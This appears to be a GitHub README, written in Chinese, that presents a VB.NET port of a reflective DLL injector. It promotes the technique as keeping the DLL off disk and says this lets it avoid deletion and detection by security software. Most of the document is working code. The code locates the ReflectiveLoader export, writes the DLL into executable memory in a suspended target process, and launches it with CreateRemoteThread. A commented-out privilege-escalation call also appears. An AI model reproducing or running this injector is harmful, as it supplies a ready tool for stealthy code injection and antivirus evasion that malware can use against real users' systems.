# ReflectiveInjector

反射式注入器的VB.NET版本.网上都没看到VB.NET版,所以根据C++的代码转了一下,测试正常.    
反射式DLL注入是一种新型的DLL注入方式，它不需要像传统的注入方式一样需要DLL落地存储，避免了注入DLL被安全软件删除的危险。 由于它没有通过系统API对DLL进行装载，操作系统无从得知被注入进程装载了该DLL，所以检测软件也无法检测它。

```vb.net
	Private Function GetReflectiveLoaderOffset(ByVal baseAddress As IntPtr) As IntPtr
		Dim dos_header As IMAGE_DOS_HEADER = Marshal.PtrToStructure(baseAddress, GetType(IMAGE_DOS_HEADER))
		Dim nt_header_ptr As IntPtr = IntPtr.Add(baseAddress, dos_header.e_lfanew)
		Dim nt_header As IMAGE_NT_HEADERS32 = Marshal.PtrToStructure(nt_header_ptr, GetType(IMAGE_NT_HEADERS32))
		If nt_header.OptionalHeader.IMAGE_DIRECTORY_ENTRY_EXPORT.VirtualAddress = UInteger.MinValue Then Return Nothing
		Dim lpIED As IntPtr = ImageRvaToVa(nt_header_ptr, baseAddress, nt_header.OptionalHeader.IMAGE_DIRECTORY_ENTRY_EXPORT.VirtualAddress, Nothing)
		Dim IED As IMAGE_EXPORT_DIRECTORY = Marshal.PtrToStructure(lpIED, GetType(IMAGE_EXPORT_DIRECTORY))
		Dim ppExportOfNames As IntPtr = ImageRvaToVa(nt_header_ptr, baseAddress, IED.AddressOfNames, Nothing)
		For i As Integer = 0 To IED.NumberOfNames - 1
			Dim pstrExportOfName As IntPtr = ImageRvaToVa(nt_header_ptr, baseAddress, Marshal.ReadInt32(ppExportOfNames, i * 4), Nothing)
			If Marshal.PtrToStringAnsi(pstrExportOfName).Contains("ReflectiveLoader") Then
				Dim uiAddressArray As IntPtr = ImageRvaToVa(nt_header_ptr, baseAddress, IED.AddressOfFunctions, Nothing)
				Dim uiNameOrdinals As IntPtr = ImageRvaToVa(nt_header_ptr, baseAddress, IED.AddressOfNameOrdinals, Nothing)
				Dim nameOrdinal As UInteger = Marshal.ReadInt16(uiNameOrdinals)
				uiAddressArray += nameOrdinal * 4
				Dim functionRva As UInteger = Marshal.ReadInt32(uiAddressArray)
				For n = 0 To nt_header.FileHeader.NumberOfSections - 1
					Dim imageSectionPtr As IntPtr = IntPtr.Add(IntPtr.Add(baseAddress, dos_header.e_lfanew), Marshal.SizeOf(New IMAGE_NT_HEADERS32()) + n * Marshal.SizeOf(New IMAGE_SECTION_HEADER()))
					Dim pSectionHeader = Marshal.PtrToStructure(imageSectionPtr, GetType(IMAGE_SECTION_HEADER))
					If functionRva >= pSectionHeader.VirtualAddress AndAlso functionRva < (pSectionHeader.VirtualAddress + pSectionHeader.SizeOfRawData) Then
						functionRva = functionRva - pSectionHeader.VirtualAddress + pSectionHeader.PointerToRawData
						Return functionRva
					End If
				Next
			End If
		Next
		Return 0
	End Function
  
  Public Function LoadRemoteLibraryR(hProcess As IntPtr, lpBuffer() As Byte, dwLength As UInteger) As IntPtr
		Dim dwThreadId As UInteger
		Dim hThread As IntPtr = Nothing
		Dim baseAddress As IntPtr = Marshal.AllocHGlobal(lpBuffer.Length)
		Marshal.Copy(lpBuffer, 0, baseAddress, lpBuffer.Length)

		Dim dwReflectiveLoaderOffset As UInteger = GetReflectiveLoaderOffset(baseAddress)
		If dwReflectiveLoaderOffset = 0 Then
			Return IntPtr.Zero
		End If

		Dim lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, IntPtr.Zero, dwLength, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE) 'PAGE_READWRITE
		If lpRemoteLibraryBuffer = IntPtr.Zero Then
			Return IntPtr.Zero
		End If
		If Not WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, Nothing) Then
			Return IntPtr.Zero
		End If
		Dim lpReflectiveLoader As IntPtr = IntPtr.Add(lpRemoteLibraryBuffer, dwReflectiveLoaderOffset)
		hThread = CreateRemoteThread(hProcess, Nothing, 1024 * 1024, lpReflectiveLoader, lpParameter, 0, dwThreadId)
		Marshal.FreeHGlobal(baseAddress)
		Return hThread
	End Function
```
to use:

```vb.net
Private Function ReflectiveDLLInjection( DllPath As String, ExePath As String) As IntPtr
        Dim SecAttr As New SECURITY_ATTRIBUTES
        Dim SecDesc As New SECURITY_DESCRIPTOR
        Dim pSecAttr As IntPtr = Marshal.AllocHGlobal(Marshal.SizeOf(SecAttr))
        If InitializeSecurityDescriptor(SecDesc, SECURITY_DESCRIPTOR_REVISION) AndAlso SetSecurityDescriptorDacl(SecDesc, True, IntPtr.Zero, False) Then
            Dim SecDescPtr As IntPtr = Marshal.AllocHGlobal(Marshal.SizeOf(SecDesc))
            Marshal.StructureToPtr(SecDesc, SecDescPtr, False)
            SecAttr.nLength = Marshal.SizeOf(SecAttr)
            SecAttr.lpSecurityDescriptor = SecDescPtr
            SecAttr.bInheritHandle = True
            Marshal.StructureToPtr(SecAttr, pSecAttr, True)
        End If


        Dim si As New STARTUPINFO()
        Dim pi As New PROCESS_INFORMATION()
        Dim hRet = CreateProcess(ExePath, Nothing, pSecAttr, IntPtr.Zero, False, CREATE_SUSPENDED, IntPtr.Zero, Nothing, si, pi) 'DEBUG_ONLY_THIS_PROCESS Or DEBUG_PROCESS Or CREATE_NO_WINDOW
        If hRet = False Then
            'MsgBox("创建进程失败.")
            Return Nothing
        End If


        Dim hFile As IntPtr = CreateFile(DllPath, GENERIC_READ, FILE_SHARE_READ Or FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero)
        If hFile = IntPtr.Zero Then
            'MsgBox("打开dll错误.")
            Return Nothing
        End If
        Dim dwLength = GetFileSize(hFile, Nothing)
        Dim lpBuffer(dwLength - 1) As Byte
        Dim dwBytesRead As New UInteger
        ReadFile(hFile, lpBuffer, dwLength, dwBytesRead, IntPtr.Zero)
        'PrivilegeEscalation()

        Dim hHandle = OpenProcess(PROCESS_ALL_ACCESS Or PROCESS_VM_OPERATION Or PROCESS_VM_READ Or PROCESS_VM_WRITE, False, pi.dwProcessId)

        Dim Handle = LoadRemoteLibraryR(hHandle, lpBuffer, dwLength)

        'Dim result = TerminateProcess(pi.hProcess, 0)
        Marshal.FreeHGlobal(pSecAttr)
        Return pi.hProcess
    End Function
    ```
